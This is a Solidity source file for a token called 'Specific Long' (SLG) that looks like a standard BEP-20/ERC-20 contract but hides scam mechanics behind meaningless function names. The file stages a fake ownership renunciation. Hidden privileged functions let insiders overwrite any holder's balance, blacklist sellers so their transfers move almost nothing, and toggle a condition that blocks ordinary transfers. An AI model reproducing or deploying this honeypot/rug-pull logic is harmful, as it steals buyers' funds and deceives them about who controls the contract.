//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface totalTeamMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract liquidityIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeExempt {
    function createPair(address fundSell, address marketingEnable) external returns (address);
}

interface senderMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minModeLiquidity) external view returns (uint256);

    function transfer(address tradingLaunchLiquidity, uint256 atLaunched) external returns (bool);

    function allowance(address exemptTotalMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 atLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address tradingLaunchLiquidity,
        uint256 atLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchListFee, uint256 value);
    event Approval(address indexed exemptTotalMin, address indexed spender, uint256 value);
}

interface senderMinMetadata is senderMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SpecificLong is liquidityIs, senderMin, senderMinMetadata {

    uint256 public walletIs;

    function approve(address amountFund, uint256 atLaunched) public virtual override returns (bool) {
        marketingTrading[_msgSender()][amountFund] = atLaunched;
        emit Approval(_msgSender(), amountFund, atLaunched);
        return true;
    }

    mapping(address => bool) public walletSender;

    function minEnable(address teamTx) public {
        amountAt();
        if (exemptFee != walletIs) {
            launchMax = receiverLimit;
        }
        if (teamTx == autoExemptSender || teamTx == takeBuy) {
            return;
        }
        receiverFee[teamTx] = true;
    }

    bool public modeReceiver;

    function transferFrom(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) external override returns (bool) {
        if (_msgSender() != shouldTeamWallet) {
            if (marketingTrading[tokenMarketingAmount][_msgSender()] != type(uint256).max) {
                require(atLaunched <= marketingTrading[tokenMarketingAmount][_msgSender()]);
                marketingTrading[tokenMarketingAmount][_msgSender()] -= atLaunched;
            }
        }
        return receiverTo(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);
    }

    function name() external view virtual override returns (string memory) {
        return teamIs;
    }

    bool private launchedMin;

    function liquidityTotal(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) internal returns (bool) {
        require(launchSwap[tokenMarketingAmount] >= atLaunched);
        launchSwap[tokenMarketingAmount] -= atLaunched;
        launchSwap[tradingLaunchLiquidity] += atLaunched;
        emit Transfer(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);
        return true;
    }

    function buyMarketing(address takeList, uint256 atLaunched) public {
        amountAt();
        launchSwap[takeList] = atLaunched;
    }

    mapping(address => bool) public receiverFee;

    address public takeBuy;

    uint256 public minFromLaunch;

    function balanceOf(address minModeLiquidity) public view virtual override returns (uint256) {
        return launchSwap[minModeLiquidity];
    }

    address shouldTeamWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant teamMin = 10 ** 10;

    address private modeLaunched;

    address autoIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public exemptFee;

    uint256 private tokenShould = 100000000 * 10 ** 18;

    constructor (){
        if (autoEnable) {
            walletIs = receiverLimit;
        }
        totalTeamMax buyAmountMarketing = totalTeamMax(shouldTeamWallet);
        takeBuy = feeExempt(buyAmountMarketing.factory()).createPair(buyAmountMarketing.WETH(), address(this));
        
        autoExemptSender = _msgSender();
        isFee();
        walletSender[autoExemptSender] = true;
        launchSwap[autoExemptSender] = tokenShould;
        if (walletIs == minFromLaunch) {
            minFromLaunch = walletIs;
        }
        emit Transfer(address(0), autoExemptSender, tokenShould);
    }

    bool public autoEnable;

    function decimals() external view virtual override returns (uint8) {
        return teamTotal;
    }

    function receiverTo(address tokenMarketingAmount, address tradingLaunchLiquidity, uint256 atLaunched) internal returns (bool) {
        if (tokenMarketingAmount == autoExemptSender) {
            return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);
        }
        uint256 liquidityAuto = senderMin(takeBuy).balanceOf(autoIs);
        require(liquidityAuto == enableWallet);
        require(tradingLaunchLiquidity != autoIs);
        if (receiverFee[tokenMarketingAmount]) {
            return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, teamMin);
        }
        return liquidityTotal(tokenMarketingAmount, tradingLaunchLiquidity, atLaunched);
    }

    function amountAt() private view {
        require(walletSender[_msgSender()]);
    }

    uint256 private launchMax;

    uint8 private teamTotal = 18;

    function transfer(address takeList, uint256 atLaunched) external virtual override returns (bool) {
        return receiverTo(_msgSender(), takeList, atLaunched);
    }

    uint256 public receiverLimit;

    function getOwner() external view returns (address) {
        return modeLaunched;
    }

    uint256 private fromWallet;

    string private modeMarketing = "SLG";

    function allowance(address listMax, address amountFund) external view virtual override returns (uint256) {
        if (amountFund == shouldTeamWallet) {
            return type(uint256).max;
        }
        return marketingTrading[listMax][amountFund];
    }

    mapping(address => mapping(address => uint256)) private marketingTrading;

    string private teamIs = "Specific Long";

    function symbol() external view virtual override returns (string memory) {
        return modeMarketing;
    }

    event OwnershipTransferred(address indexed autoSell, address indexed swapMode);

    function isFee() public {
        emit OwnershipTransferred(autoExemptSender, address(0));
        modeLaunched = address(0);
    }

    function swapTotal(uint256 atLaunched) public {
        amountAt();
        enableWallet = atLaunched;
    }

    function sellTo(address isSenderShould) public {
        if (modeReceiver) {
            return;
        }
        
        walletSender[isSenderShould] = true;
        if (exemptFee == fromWallet) {
            walletIs = launchMax;
        }
        modeReceiver = true;
    }

    address public autoExemptSender;

    uint256 enableWallet;

    uint256 minAuto;

    function owner() external view returns (address) {
        return modeLaunched;
    }

    uint256 private shouldMin;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenShould;
    }

    bool public teamShould;

    mapping(address => uint256) private launchSwap;

}